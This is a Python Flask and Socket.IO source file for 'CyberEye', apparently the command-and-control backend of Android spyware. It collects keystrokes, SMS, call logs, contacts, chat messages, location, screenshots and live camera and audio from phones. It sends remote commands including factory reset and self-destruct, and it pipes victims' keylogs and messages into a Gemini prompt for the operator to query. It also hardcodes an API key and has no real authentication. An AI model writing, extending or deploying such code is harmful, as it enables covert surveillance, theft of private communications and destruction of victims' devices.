import os
import json
import re
import time
import requests
from flask import Flask, render_template, request, jsonify, redirect, url_for, send_file
from flask_socketio import SocketIO, emit, join_room, leave_room

app = Flask(__name__)
app.config['SECRET_KEY'] = 'cybereye-secret'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet', allow_eio3=True)

# --- CONFIGURATION ---
DB_FILE = 'database.json'
BLACKLIST = ["info", "services", "default_device", "web", "🌐", "web"]
GEMINI_API_KEY = "AIzaSyBsHMZ1SrAaMXdXScPGbycCZokkD5B3tP0"

database = {}
data_cache = {} # RAM Cache

# Connected clients map: device_id -> socket session ID (sid)
connected_devices = {}
sid_to_device = {}

def load_db():
    global database
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                database = json.load(f)
                for b in BLACKLIST:
                    for k in list(database.keys()):
                        if b in k.lower(): del database[k]
        except: database = {}
    else: database = {}

def save_db():
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(database, f, indent=2, ensure_ascii=False)
    except: pass

load_db()

def run_async(val):
    return val

def get_and_parse_cloud_data(device_id, category):
    file_path = os.path.join("data", device_id, f"{category}.txt")
    if not os.path.exists(file_path): return None
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        parsed_list = []
        if category == "calls":
            contacts_list = get_and_parse_cloud_data(device_id, "contacts") or []
            contact_map = {}
            for c in contacts_list:
                c_num = c.get('number')
                c_name = c.get('name')
                if c_num and c_name:
                    norm = "".join(ch for ch in str(c_num) if ch.isdigit())[-10:]
                    if norm:
                        contact_map[norm] = c_name

            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Num' in p:
                        num = p['Num']
                        norm_num = "".join(ch for ch in str(num) if ch.isdigit())[-10:]
                        name = contact_map.get(norm_num, "")
                        parsed_list.append({
                            'number': num,
                            'name': name,
                            'duration': p.get('Dur','0s'),
                            'type': p.get('Type',''),
                            'date': p.get('Date','')
                        })
            parsed_list.sort(key=lambda x: x.get('date', ''), reverse=True)
        elif category == "sms":
            contacts_list = get_and_parse_cloud_data(device_id, "contacts") or []
            contact_map = {}
            for c in contacts_list:
                c_num = c.get('number')
                c_name = c.get('name')
                if c_num and c_name:
                    norm = "".join(ch for ch in str(c_num) if ch.isdigit())[-10:]
                    if norm:
                        contact_map[norm] = c_name

            for chunk in content.split('---'):
                if '|' in chunk:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in chunk.split('|') if ':' in x}
                    if 'From' in p:
                        from_num = p['From']
                        norm_num = "".join(ch for ch in str(from_num) if ch.isdigit())[-10:]
                        name = contact_map.get(norm_num, "")
                        address = f"{name} ({from_num})" if name else from_num
                        parsed_list.append({
                            'address': address,
                            'body': p.get('Msg',''),
                            'type': p.get('Type',''),
                            'date': p.get('Date','')
                        })
            parsed_list.sort(key=lambda x: x.get('date', ''), reverse=True)
        elif category == "apps":
            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Pkg' in p: parsed_list.append({'name': p.get('Name','Unknown'), 'package': p['Pkg']})
        elif category == "contacts":
            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Num' in p: parsed_list.append({'name': p.get('Name','Unknown'), 'number': p['Num']})
        elif category == "accounts":
            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Name' in p: parsed_list.append({'type': p.get('Type',''), 'name': p['Name']})
        elif category == "notifications":
            for chunk in content.split('---'):
                if '|' in chunk:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in chunk.split('|') if ':' in x}
                    if 'App' in p: parsed_list.append({'app': p['App'], 'title': p.get('Title',''), 'text': p.get('Msg',''), 'time': p.get('Time','')})
        elif "usage" in category:
            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':',1)[0].strip(): x.split(':',1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Name' in p: parsed_list.append({'name': p['Name'], 'package': p.get('Pkg',''), 'usage': p.get('Usage',''), 'ms': int(p.get('MS','0'))})
        elif category == "files":
            try:
                return json.loads(content)
            except:
                return []
        return parsed_list
    except: return None

def update_device_record(device_id, category, data):
    global database
    if not device_id or device_id.lower() in BLACKLIST: return
    if device_id not in database:
        database[device_id] = {}

    if "_id" not in database[device_id]: database[device_id]["_id"] = device_id
    if "lastSeen" not in database[device_id]: database[device_id]["lastSeen"] = int(time.time()*1000)
    if "info" not in database[device_id]: database[device_id]["info"] = {}
    if "refs" not in database[device_id]: database[device_id]["refs"] = {}
    if "media" not in database[device_id]: database[device_id]["media"] = {}
    if "logs" not in database[device_id]: database[device_id]["logs"] = []
    if "chats" not in database[device_id]: database[device_id]["chats"] = {}

    database[device_id]["lastSeen"] = int(time.time() * 1000)

    if category == "info" and isinstance(data, str):
        info = {}
        for line in data.split('\n'):
            if ':' in line:
                k, v = line.split(':', 1)
                info[k.strip().lower()] = v.strip()
        database[device_id]["info"].update(info)
    elif category == "location" and isinstance(data, dict):
        if "location" not in database[device_id]: database[device_id]["location"] = {}
        database[device_id]["location"].update(data)
    elif category == "logs":
        database[device_id]["logs"].append({"text": str(data), "time": int(time.time()*1000)})
        database[device_id]["logs"] = database[device_id]["logs"][-100:]
    elif category == "media" and isinstance(data, dict):
        if "media" not in database[device_id]: database[device_id]["media"] = {}
        database[device_id]["media"].update(data)
    save_db()

# --- Socket.io Event Handlers ---
@socketio.on('connect')
def handle_connect():
    device_id = request.args.get('device_id')
    model = request.args.get('model', 'Unknown')
    manf = request.args.get('manf', 'Unknown')
    release = request.args.get('release', 'Unknown')
    
    if device_id:
        join_room(device_id)
        connected_devices[device_id] = request.sid
        sid_to_device[request.sid] = device_id
        
        ip = request.remote_addr
        info_string = f"model: {model}\nmanufacturer: {manf}\nandroid: {release}\nadmin: false\nbattery: --%\nnotif_pending: 0\nip: {ip}\n"
        update_device_record(device_id, "info", info_string)
        update_device_record(device_id, "logs", "Device Connected via Socket.io")
        print(f"[Socket.io] Device connected: {device_id} (Model: {model})")
        # Notify dashboard
        socketio.emit('device_status_change', {'device_id': device_id, 'online': True})

@socketio.on('disconnect')
def handle_disconnect():
    device_id = sid_to_device.pop(request.sid, None)
    if device_id:
        connected_devices.pop(device_id, None)
        print(f"[Socket.io] Device disconnected: {device_id}")
        update_device_record(device_id, "logs", "Device Disconnected")
        # Notify dashboard
        socketio.emit('device_status_change', {'device_id': device_id, 'online': False})

@socketio.on('keylogs')
def handle_keylogs(data):
    # data: {"pkg": String, "text": String, "time": Long}
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        pkg = data.get("pkg", "unknown")
        text = data.get("text", "")
        log_time = data.get("time", int(time.time() * 1000))
        
        if device_id not in database: database[device_id] = {"_id": device_id}
        if "keylogs" not in database[device_id]: database[device_id]["keylogs"] = {}
        
        log_id = f"kl_{log_time}"
        database[device_id]["keylogs"][log_id] = {
            "pkg": pkg,
            "text": text,
            "time": log_time
        }
        update_device_record(device_id, "logs", f"Keylog entry received from {pkg}")
        save_db()
        socketio.emit('keylog_received', {
            'device_id': device_id,
            'pkg': pkg,
            'text': text,
            'time': log_time
        })

@socketio.on('notification_logged')
def handle_notification_logged(data):
    # data: {"package": String, "title": String, "text": String, "time": String}
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        pkg = data.get("package", "unknown")
        title = data.get("title", "")
        text = data.get("text", "")
        log_time = data.get("time", "")
        
        entry = f"App: {pkg} | Title: {title} | Msg: {text} | Time: {log_time}"
        
        file_path = os.path.join("data", device_id, "notifications.txt")
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(f"App: {pkg} | Title: {title} | Msg: {text} | Time: {log_time}\n---\n")
            
        if "info" not in database[device_id]: database[device_id]["info"] = {}
        curr_count = int(database[device_id]["info"].get("notif_pending", 0)) + 1
        database[device_id]["info"]["notif_pending"] = str(curr_count)
        
        if "refs" not in database[device_id]: database[device_id]["refs"] = {}
        database[device_id]["refs"]["notifications"] = int(time.time() * 1000)

@socketio.on('location')
def handle_location(data):
    # data: {"lat": Double, "lng": Double, "time": Long} or {"error": String, "time": Long}
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        update_device_record(device_id, "location", data)
        # Forward the location event to the dashboard
        if "error" in data:
            socketio.emit('location_error', {
                'device_id': device_id,
                'error': data.get("error", "Unknown error")
            })
        else:
            socketio.emit('location_update', {
                'device_id': device_id,
                'lat': data.get("lat"),
                'lng': data.get("lng")
            })

@socketio.on('social_message')
def handle_social_message(data):
    # data: {"platform": String, "contact": String, "text": String, "isSent": Boolean, "time": Long}
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        platform = data.get("platform", "unknown").replace(".", "_")
        contact = data.get("contact", "unknown").replace(".", "_").replace(" ", "_")
        text = data.get("text", "")
        is_sent = data.get("isSent", False)
        msg_time = data.get("time", int(time.time() * 1000))

        if device_id not in database: database[device_id] = {"_id": device_id}
        if "chats" not in database[device_id]: database[device_id]["chats"] = {}
        if platform not in database[device_id]["chats"]: database[device_id]["chats"][platform] = {}
        if contact not in database[device_id]["chats"][platform]:
            database[device_id]["chats"][platform][contact] = {"contactName": contact, "messages": {}}

        # Deduplication check: Check if same text and type exists in the last 40 messages of this chat
        messages_dict = database[device_id]["chats"][platform][contact]["messages"]
        is_duplicate = False
        if messages_dict:
            sorted_msgs = sorted(messages_dict.values(), key=lambda x: x.get("time", 0), reverse=True)
            for m in sorted_msgs[:40]:
                if m.get("text") == text and m.get("type") == ("sent" if is_sent else "received"):
                    # Check if the duplicate is from a recent scrape (within 24 hours)
                    if abs(m.get("time", 0) - msg_time) < 86400000:
                        is_duplicate = True
                        break

        if is_duplicate:
            return

        m_id = str(hash(text + ("sent" if is_sent else "received") + str(msg_time)))
        database[device_id]["chats"][platform][contact]["messages"][m_id] = {
            "text": text,
            "type": "sent" if is_sent else "received",
            "time": msg_time
        }
        save_db()
        socketio.emit('social_message_received', {
            'device_id': device_id,
            'platform': platform,
            'contact': contact,
            'text': text,
            'isSent': is_sent,
            'time': msg_time
        })

# --- HTTP Routes ---
@app.route('/')
def index():
    return redirect(url_for('introl_view'))

@app.route('/introl')
def introl_view():
    return render_template('introl.html')

@app.route('/logout')
def logout():
    return jsonify({'success': True})

@app.route('/introl.mp4')
def serve_intro_video():
    return send_file('introl.mp4')

@app.route('/logo.png')
@app.route('/static/logo.png')
def serve_logo():
    return send_file('logo.png')

@app.route('/dashboard')
def dashboard_view():
    return render_template('dashbord.html')

@app.route('/check_auth')
def check_auth():
    return jsonify({'authorized': True})

@app.route('/api/devices')
def api_devices():
    devices = []
    for k in database.keys():
        if k.lower() in BLACKLIST: continue
        v = database.get(k, {})
        online = k in connected_devices
        devices.append({
            "id": k,
            "model": v.get("info", {}).get("model", k),
            "lastSeen": v.get("lastSeen", 0),
            "online": online
        })
    return jsonify(devices)

@app.route('/keylogs')
def keylogs_view():
    return render_template('keylogs.html')

@app.route('/file_manager')
def file_manager_view():
    return render_template('file_manager.html')

@app.route('/social_media')
def social_media_view():
    return render_template('social_media.html')

@app.route('/location_3d')
def location_3d_view():
    return render_template('location.html')

@app.route('/ai_chatbot')
def ai_chatbot_view():
    return render_template('Ai_chatbot.html')

@app.route('/Screen_mirroring.html')
def mirror_view():
    return render_template('Screen_mirroring.html')

@app.route('/Live_Camera.html')
def live_camera_view():
    return render_template('Live_Camera.html')

@app.route('/Live_Audio.html')
def live_audio_view():
    return render_template('Live_Audio.html')

@app.route('/api/device/<device_id>/data')
def api_device_data(device_id):
    if device_id not in database: return jsonify({"error": "Not found"}), 404
    resp_data = dict(database[device_id])
    for cat in ["calls", "sms", "apps", "contacts", "accounts", "notifications", "files"]:
        local_list = get_and_parse_cloud_data(device_id, category=cat)
        resp_data[cat] = local_list if local_list else []

    resp_data['usage'] = {}
    for sub in ["daily", "weekly", "monthly"]:
        u_cat = f"usage_{sub}"
        u_list = get_and_parse_cloud_data(device_id, category=u_cat)
        resp_data['usage'][sub] = u_list if u_list else []

    resp_data['settings'] = database[device_id].get("settings", {})
    return jsonify(resp_data)

@app.route('/api/device/<device_id>/ai_context')
def ai_context(device_id):
    if device_id not in database: return jsonify({"error": "Device not found"}), 404

    calls = get_and_parse_cloud_data(device_id, "calls") or []
    sms = get_and_parse_cloud_data(device_id, "sms") or []
    notifs = get_and_parse_cloud_data(device_id, "notifications") or []
    contacts = get_and_parse_cloud_data(device_id, "contacts") or []
    chats = database.get(device_id, {}).get('chats', {})

    keylogs = []
    if device_id in database and "keylogs" in database[device_id]:
        keylogs = list(database[device_id]["keylogs"].values())
    
    keylogs.sort(key=lambda x: x.get('time', 0))

    return jsonify({
        "device_id": device_id,
        "current_time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "calls": calls[:40],
        "sms": sms[:40],
        "notifications": notifs[:30],
        "contacts": contacts,
        "chats": chats,
        "keylogs": keylogs[-600:]
    })

@app.route('/api/device/<device_id>/ai_chat', methods=['POST'])
def ai_chat(device_id):
    if device_id not in database: return jsonify({"error": "Device not found"}), 404
    user_msg = request.json.get('message')

    calls = get_and_parse_cloud_data(device_id, "calls") or []
    sms = get_and_parse_cloud_data(device_id, "sms") or []
    notifs = get_and_parse_cloud_data(device_id, "notifications") or []
    
    keylogs = []
    if device_id in database and "keylogs" in database[device_id]:
        keylogs = list(database[device_id]["keylogs"].values())

    context = f"You are CyberEye AI Assistant. Operating on Device: {device_id}\n"
    context += f"CALL LOGS: {json.dumps(calls[:20])}\n"
    context += f"SMS LOGS: {json.dumps(sms[:20])}\n"
    context += f"NOTIFICATIONS: {json.dumps(notifs[:15])}\n"
    context += f"RECENT KEYLOGS: {json.dumps(keylogs[:30])}\n"
    context += "\nInstruction: Answer the user's question based on this data. If data is empty, say no logs found yet. Speak professionally in English."

    try:
        url = f"https://generativelanguage.googleapis.com/v1/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
        payload = {
            "contents": [{"parts": [{"text": f"{context}\n\nUser Question: {user_msg}"}]}]
        }
        headers = {"Content-Type": "application/json"}
        gemini_resp = requests.post(url, json=payload, headers=headers, timeout=20)
        result = gemini_resp.json()

        if 'candidates' in result and len(result['candidates']) > 0:
            ai_reply = result['candidates'][0]['content']['parts'][0]['text']
            return jsonify({"reply": ai_reply})
        else:
            url_pro = f"https://generativelanguage.googleapis.com/v1/models/gemini-1.5-pro:generateContent?key={GEMINI_API_KEY}"
            resp_pro = requests.post(url_pro, json=payload, headers=headers, timeout=20)
            res_pro = resp_pro.json()
            if 'candidates' in res_pro and len(res_pro['candidates']) > 0:
                return jsonify({"reply": res_pro['candidates'][0]['content']['parts'][0]['text']})

            error_msg = result.get('error', {}).get('message', 'AI Model not responding.')
            return jsonify({"reply": f"AI Error: {error_msg}"})
    except Exception as e:
        return jsonify({"reply": "Network Error: System core unstable."})

@app.route('/api/device/<device_id>/monitored_apps', methods=['GET', 'POST'])
def api_monitored_apps(device_id):
    if device_id not in database: database[device_id] = {"_id": device_id}
    if "settings" not in database[device_id]: database[device_id]["settings"] = {}
    if "monitored_apps" not in database[device_id]["settings"]: database[device_id]["settings"]["monitored_apps"] = {}
    
    if request.method == 'POST':
        action = request.json.get('action')
        package = request.json.get('package', '').strip()
        name = request.json.get('name', '').strip()
        
        if not package:
            return jsonify({'success': False, 'error': 'Package name is required'}), 400
            
        key = package.replace('.', '_')
        if action == 'add':
            if not name:
                return jsonify({'success': False, 'error': 'App name is required for adding'}), 400
            database[device_id]["settings"]["monitored_apps"][key] = {
                "name": name,
                "package": package
            }
            save_db()
            
            sid = connected_devices.get(device_id)
            if sid:
                socketio.emit('command', {'action': f"MONITOR_APP:{package}"}, room=sid)
            return jsonify({'success': True})
            
        elif action == 'remove':
            if key in database[device_id]["settings"]["monitored_apps"]:
                del database[device_id]["settings"]["monitored_apps"][key]
                save_db()
                
                sid = connected_devices.get(device_id)
                if sid:
                    socketio.emit('command', {'action': f"UNMONITOR_APP:{package}"}, room=sid)
                return jsonify({'success': True})
            return jsonify({'success': False, 'error': 'App not found'}), 404
            
    return jsonify(database[device_id]["settings"]["monitored_apps"])

@app.route('/api/device/<device_id>/mirror_status')
def api_device_mirror(device_id):
    if device_id not in database: return jsonify({})
    d = database[device_id]
    return jsonify({
        "url": d.get("mirror_url"),
        "time": d.get("mirror_time"),
        "bat": d.get("info", {}).get("battery", "--")
    })

@app.route('/api/device/<device_id>/live_camera_status')
def api_device_live_camera(device_id):
    if device_id not in database: return jsonify({})
    d = database[device_id]
    return jsonify({
        "url": d.get("live_camera_url"),
        "time": d.get("live_camera_time"),
        "bat": d.get("info", {}).get("battery", "--")
    })

@app.route('/api/device/<device_id>/live_audio_status')
def api_device_live_audio(device_id):
    if device_id not in database: return jsonify({})
    d = database[device_id]
    return jsonify({
        "url": d.get("live_audio_url"),
        "time": d.get("live_audio_time")
    })

@app.route('/api/device/<device_id>/previews')
def api_device_previews(device_id):
    if device_id not in database: return jsonify({})
    return jsonify(database[device_id].get("previews", {}))

@app.route('/api/media/stream/<device_id>/<filename>')
def stream_media(device_id, filename):
    file_path = os.path.join("media", device_id, filename)
    if os.path.exists(file_path):
        return send_file(file_path)
    return "Not Found", 404

@app.route('/api/device/<device_id>/upload_media', methods=['POST'])
def api_device_upload_media(device_id):
    if 'file' not in request.files:
        return jsonify({"success": False, "error": "No file part"}), 400
    file = request.files['file']
    category = request.form.get('category', 'files')
    if file.filename == '':
        return jsonify({"success": False, "error": "No selected file"}), 400
        
    os.makedirs(os.path.join("data", device_id), exist_ok=True)
    os.makedirs(os.path.join("media", device_id), exist_ok=True)
    
    filename = file.filename
    text_categories = ["calls", "sms", "contacts", "apps", "accounts", "notifications", "usage_daily", "usage_weekly", "usage_monthly", "files", "info"]
    
    if category in text_categories:
        file_path = os.path.join("data", device_id, f"{category}.txt")
        file.save(file_path)
        
        if device_id not in database: database[device_id] = {"_id": device_id}
        if "refs" not in database[device_id]: database[device_id]["refs"] = {}
        database[device_id]["refs"][category] = int(time.time() * 1000)
        database[device_id]["lastSeen"] = int(time.time() * 1000)
        
        if category == "info":
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    info_content = f.read()
                update_device_record(device_id, "info", info_content)
                update_device_record(device_id, "info", f"ip: {request.remote_addr}\n")
            except Exception as e:
                print(f"[Upload] Error parsing info file: {e}")
                
        save_db()
        if category == "files":
            socketio.emit('files_updated', {'device_id': device_id})
    else:
        if category == "wallpaper":
            file_path = os.path.join("media", device_id, "wallpaper.jpg")
            file.save(file_path)
            
            if device_id not in database: database[device_id] = {"_id": device_id}
            database[device_id]["wallpaper_url"] = f"/api/media/stream/{device_id}/wallpaper.jpg?t={int(time.time()*1000)}"
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            socketio.emit('wallpaper_update', {'device_id': device_id, 'url': database[device_id]["wallpaper_url"]}, room=device_id)
        elif category == "mirror":
            file_path = os.path.join("media", device_id, "mirror.jpg")
            file.save(file_path)
            
            if device_id not in database: database[device_id] = {"_id": device_id}
            database[device_id]["mirror_url"] = f"/api/media/stream/{device_id}/mirror.jpg?t={int(time.time()*1000)}"
            database[device_id]["mirror_time"] = int(time.time() * 1000)
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            socketio.emit('mirror_update', {'device_id': device_id, 'url': database[device_id]["mirror_url"]}, room=device_id)
        elif category == "live_camera":
            file_path = os.path.join("media", device_id, "live_camera.jpg")
            file.save(file_path)
            
            if device_id not in database: database[device_id] = {"_id": device_id}
            database[device_id]["live_camera_url"] = f"/api/media/stream/{device_id}/live_camera.jpg?t={int(time.time()*1000)}"
            database[device_id]["live_camera_time"] = int(time.time() * 1000)
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            socketio.emit('live_camera_update', {'device_id': device_id, 'url': database[device_id]["live_camera_url"]}, room=device_id)
        elif category == "live_audio":
            file_path = os.path.join("media", device_id, filename)
            file.save(file_path)
            
            if device_id not in database: database[device_id] = {"_id": device_id}
            chunk_url = f"/api/media/stream/{device_id}/{filename}"
            database[device_id]["live_audio_url"] = chunk_url
            database[device_id]["live_audio_time"] = int(time.time() * 1000)
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            socketio.emit('live_audio_chunk', {'device_id': device_id, 'url': chunk_url}, room=device_id)
        elif category == "previews":
            file_path = os.path.join("media", device_id, filename)
            file.save(file_path)
            
            path_on_device = request.form.get('path', '')
            fbKey = f"p_{int(time.time() * 1000)}"
            preview_entry = {
                "time": int(time.time() * 1000),
                "url": f"/api/media/stream/{device_id}/{filename}",
                "name": filename,
                "path": path_on_device
            }
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "previews" not in database[device_id]: database[device_id]["previews"] = {}
            database[device_id]["previews"][fbKey] = preview_entry
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
        else:
            file_path = os.path.join("media", device_id, filename)
            file.save(file_path)
            
            media_type = "file"
            if category == "screenshot":
                media_type = "screenshot"
            elif category == "image":
                media_type = "image"
            elif category == "audio":
                media_type = "audio"
            elif category == "call_recording":
                media_type = "call_recording"
                
            fbKey = f"m_{int(time.time() * 1000)}"
            media_entry = {
                "time": int(time.time() * 1000),
                "url": f"/api/media/stream/{device_id}/{filename}",
                "name": filename,
                "type": media_type,
                "path": file_path
            }
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "media" not in database[device_id]: database[device_id]["media"] = {}
            database[device_id]["media"][fbKey] = media_entry
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            
    return jsonify({"success": True})

@app.route('/api/device/<device_id>/action', methods=['POST'])
def api_device_action(device_id):
    action = request.json.get('action')
    action_map = {
        'GET_DEVICE_INFO':'DEVICE_INFO', 'DUMP_CALLS':'CALL_LOG', 'DUMP_SMS':'SMS_LOG',
        'DUMP_CONTACTS':'CONTACTS', 'GET_ACCOUNTS':'ACCOUNTS', 'LIST_APPS':'APPS_LIST',
        'TAKE_SCREENSHOT':'SCREENSHOT', 'TAKE_PHOTO_FRONT':'PHOTO_FRONT', 'TAKE_PHOTO_REAR':'PHOTO_REAR',
        'RECORD_AUDIO_15':'MIC_15S', 'RECORD_AUDIO_300':'AUDIO_300', 'RECORD_AUDIO_600':'AUDIO_600',
        'LOCK_DEVICE':'LOCK_SCREEN', 'FACTORY_RESET':'FACTORY_RESET',
        'FORCE_LOC_V1': 'FORCE_LOC_V1', 'FORCE_LOC_V2': 'FORCE_LOC_V2',
        'SELF_DESTRUCT': 'SELF_DESTRUCT',
        'GET_LOCATION': 'GET_LOCATION',
        'USAGE_DAILY': 'USAGE_DAILY',
        'USAGE_WEEKLY': 'USAGE_WEEKLY',
        'USAGE_MONTHLY': 'USAGE_MONTHLY'
    }

    if ':' in action:
        cmd = action
        parts = action.split(':', 1)
        action_type = parts[0]
        value = parts[1].strip()

        if action_type in ['BLOCK_APP', 'UNBLOCK_APP', 'BLOCK_WEB', 'UNBLOCK_WEB']:
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "settings" not in database[device_id]: database[device_id]["settings"] = {}
            settings = database[device_id]["settings"]
            
            if action_type == 'BLOCK_APP':
                if "blocked_apps" not in settings: settings["blocked_apps"] = {}
                key = str(hash(value))
                settings["blocked_apps"][key] = value
            elif action_type == 'UNBLOCK_APP':
                if "blocked_apps" in settings:
                    keys_to_del = [k for k, v in settings["blocked_apps"].items() if v == value]
                    for k in keys_to_del: settings["blocked_apps"].pop(k)
            elif action_type == 'BLOCK_WEB':
                if "blocked_webs" not in settings: settings["blocked_webs"] = {}
                key = str(hash(value))
                settings["blocked_webs"][key] = value
            elif action_type == 'UNBLOCK_WEB':
                if "blocked_webs" in settings:
                    keys_to_del = [k for k, v in settings["blocked_webs"].items() if v == value]
                    for k in keys_to_del: settings["blocked_webs"].pop(k)
            save_db()
    else:
        cmd = action_map.get(action, action)

    sid = connected_devices.get(device_id)
    if sid:
        print(f"[Socket.io] Emitting Command: {cmd} to Device: {device_id} (sid: {sid})")
        socketio.emit('command', {'action': cmd}, room=sid)
        update_device_record(device_id, "logs", f"Sent command: {cmd}")
        return jsonify({'success': True})
    else:
        return jsonify({'success': False, 'error': 'Device offline'}), 400
@app.route('/api/device/<device_id>/clear_keylogs', methods=['POST'])
def clear_keylogs(device_id):
    if device_id in database:
        database[device_id]["keylogs"] = {}
        save_db()
    return jsonify({'success': True})

@app.route('/api/device/<device_id>/delete_media/<media_key>', methods=['POST'])
def delete_media(device_id, media_key):
    if device_id in database and "media" in database[device_id]:
        m = database[device_id]["media"].pop(media_key, None)
        if m and "path" in m:
            try:
                os.remove(m["path"])
            except: pass
        save_db()
@app.route('/api/device/<device_id>/clear_chats', methods=['POST'])
def clear_chats(device_id):
    req_json = request.json or {}
    platform = req_json.get('platform')
    contact = req_json.get('contact')
    
    if device_id in database and "chats" in database[device_id]:
        if platform:
            platform_key = platform.replace(".", "_")
            if contact:
                contact_key = contact.replace(".", "_").replace(" ", "_")
                # Wipe specific contact chats
                if platform_key in database[device_id]["chats"]:
                    database[device_id]["chats"][platform_key].pop(contact_key, None)
            else:
                # Wipe entire platform (e.g. WhatsApp / com_whatsapp)
                database[device_id]["chats"].pop(platform_key, None)
        else:
            # Wipe all social media data
            database[device_id]["chats"] = {}
        save_db()
        # Broadcast socket event to trigger UI reload
        socketio.emit('social_message_received', {
            'device_id': device_id,
            'platform': platform or '',
            'contact': contact or '',
            'text': '',
            'isSent': False,
            'time': 0
        })
    return jsonify({'success': True})


if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
